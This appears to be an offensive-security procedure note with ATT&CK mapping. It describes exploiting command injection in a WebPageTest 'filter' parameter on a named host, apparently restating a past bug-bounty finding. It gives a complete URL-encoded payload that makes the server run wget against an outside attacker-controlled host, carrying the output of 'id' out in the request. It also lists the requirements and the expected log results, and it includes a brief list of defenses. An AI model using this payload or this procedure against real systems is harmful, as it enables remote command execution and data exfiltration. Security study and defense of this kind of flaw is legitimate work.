---
id: proc-uuid-3
tags:
  - rce
  - exfiltration
  - blind-rce
  - wget
type: procedure
tools:
  - '[[tools/WebPageTest]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/id-exfiltrate]]'
  - '[[commands/wget-exfiltrate-id]]'
verified: false
platforms:
  - Web
  - AWS
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
updated_at: '2025-12-14T17:23:41.139Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
---
# Exfiltrate-Server-Information-via-Wget

## Summary

This procedure exploits the command injection to execute a wget command that exfiltrates the output of the 'id' command to an attacker-controlled server, demonstrating blind RCE and potential for full compromise.

## Description

Using the vulnerable filter parameter, inject a payload that runs wget to fetch a URL incorporating $(id), sending server user details (e.g., www-data) to your Apache server. This targets the AWS-hosted WebPageTest, confirming execution in a blind manner via external logs.

## Requirements

1. Control of an external server (e.g., sandbox.prakharprasad.com) with Apache logging
2. Access to target http://wpt.ec2.shopify.com/testlog.php
3. URL encoding knowledge for payloads

## Defense

Defensive measures and detection strategies:

- Block outbound connections from web servers to untrusted hosts
- Monitor network traffic for unexpected wget or DNS requests
- Apply least privilege to web server processes (e.g., no network access)

## Objectives

1. Execute arbitrary commands for information disclosure
2. Exfiltrate data to external endpoint
3. Verify server context and privileges

## Instructions

### Step 1: Prepare Attacker Server

**Context**: Set up logging to capture exfiltrated data.

Configure Apache on your server to log requests.

> Expected: Logs ready to receive HTTP GET with 'id' output.

### Step 2: Craft and Inject Payload

**Context**: Use wget with nested id command in the filter parameter.

**Command** ([[commands/wget-exfiltrate-id]]):
```bash
# URL-encoded payload in filter: %24%28%60wget sandbox.prakharprasad.com%2F%24%28id%29%60%29
# Full URL: http://wpt.ec2.shopify.com/testlog.php?days=1&filter=%24%28%60wget%20sandbox.prakharprasad.com%2F%24%28id%29%60%29
```

> This executes wget sandbox.prakharprasad.com/$(id), sending output to your server. Also involves [[commands/id-exfiltrate]]. Expected: Log entry like GET /uid=33(www-data)...

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Unix Shell]]
- [[Exfiltration Over Unencrypted Non-C2 Protocol]]

### Sub-Techniques


## Commands Used

- [[commands/id-exfiltrate]]
- [[commands/wget-exfiltrate-id]]

## Tools Used

- [[tools/WebPageTest]]

## Tags

- rce
- exfiltration
